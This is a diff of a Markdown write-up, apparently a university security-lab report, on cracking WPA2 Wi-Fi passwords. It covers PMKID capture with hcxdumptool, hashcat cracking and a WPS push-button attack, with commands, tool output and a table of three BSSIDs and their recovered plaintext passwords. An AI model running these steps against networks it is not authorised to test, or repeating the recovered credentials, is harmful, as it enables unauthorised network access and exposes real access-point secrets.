@@ -3,11 +3,11 @@
 ## Decryption results
 
 
-| place            | BSSID             | password            | ENC    | methods  |
-|:---------------- |:----------------- |:------------------- |:--- |:-------- |
-| 電子資訊大樓八樓 | E8:94:F6:A0:08:AE | limpbizkit          | WPA2    | method 1 |
-| 工程三館三樓     | 54:B8:0A:13:16:A6 | infornationsecurity | WPA2    | method 2 |
-| 管理二館一樓     | C4:12:F5:0A:B6:07 | lissabon            | WPA2  | method 1 |
+| place            | BSSID             | password            | ENC-AUTH     | methods  |
+|:-------------- |:----------------- |:------------------- |:--------- |:-------- |
+| 電子資訊大樓八樓 | E8:94:F6:A0:08:AE | limpbizkit          | WPA2-PSK    | method 1 |
+| 工程三館三樓     | 54:B8:0A:13:16:A6 | infornationsecurity | WPA2-PSK    | method 2 |
+| 管理二館一樓     | C4:12:F5:0A:B6:07 | lissabon            | WPA2-PSK  | method 1 |
 
 ## Methods 1 : [use hcxdumptool get PMKID and use Hashcat cracking](https://github.com/ZerBea/hcxdumptool/blob/master/docs/example.md)
 
@@ -25,9 +25,9 @@ sudo airmon-ng check kill
 sudo airmon-ng start <Network Interface>
 iwconfig
 ```
-> ==<Network Interface>==: wlan0, wlan1
-> ==<monitor interface>==: wlan1mon, wlan0mon
-> <font color="=#afeeee"> **network interface start success: (...for [phy1]wlan1 on [phy1]wlan1mon)** </font>
+> **<Network Interface>**: wlan0, wlan1
+> **<monitor interface>**: wlan1mon, wlan0mon
+> **network interface start success: (...for [phy1]wlan1 on [phy1]wlan1mon)** 
 
 ### Step 3: Start Monitoring
 ```
@@ -40,7 +40,7 @@ sudo airodump-ng <monitor interface>
 hcxdumptool --bpfc="wlan addr <BSSID lower case>" >> attack.bpf
 (e.g hcxdumptool --bpfc="wlan addr e894f6a008ae" >> attack.bpf)
 ```
-> ==<BSSID lower case>==: E8:94:F6:A0:08:AE -> e894f6a008ae     
+>** <BSSID lower case>**: E8:94:F6:A0:08:AE -> e894f6a008ae     
     
 ### Step 5: Packet Sniffing attack
 ```
@@ -96,7 +96,7 @@ session summary
 ---------------
 processed pcapng files..............: 1   
 ```
-> <font color="=#afeeee"> **Success: session summary ---- processed pcapng files ...: 1** </font>    
+> **Success: session summary ---- processed pcapng files ...: 1**    
 
 ### Step 7: Use hashcat cracking the PSK of our target network
 ```
@@ -209,9 +209,9 @@ Hardware.Mon.#1..: Temp: 51c Util: 34%
 Started: Tue Dec  2 19:55:19 2025
 Stopped: Tue Dec  2 19:56:22 2025
 ```  
-:::info
-password: limpbizkit
-:::
+
+> **password: limpbizkit**
+
     
 2. C4:12:F5:0A:B6:07 
 ```
@@ -270,9 +270,8 @@ Candidates.#1....: prometheus -> newcourt
 Hardware.Mon.#1..: Temp: 49c Util: 20%
 ....
 ```    
-:::info
-password: lissabon
-:::
+> **password: lissabon**
+
     
 ## Methods 2 : [OneShot-Extended](https://hackmd.io/_uploads/SJCgWcCzbx.png)
 
@@ -304,6 +303,7 @@ Scan with the specified Wi-Fi adapter / attempt a WPS PIN attack.
 Try connecting the AP using WPS's button pairing mode.
 
 ### Results
+```
 Running wa_supplicant.
 Starting WS push button connection
 Scanning...
@@ -335,6 +335,6 @@ Received WPS Message M8
 WPS PIN: '<PBC mode›'
 WPA PSK: 'infornationsecurity'
 AP SSID: 'IAIS-NS-30015'
-:::info
-password: infornationsecurity
-:::
+```
+> **password: infornationsecurity**
+
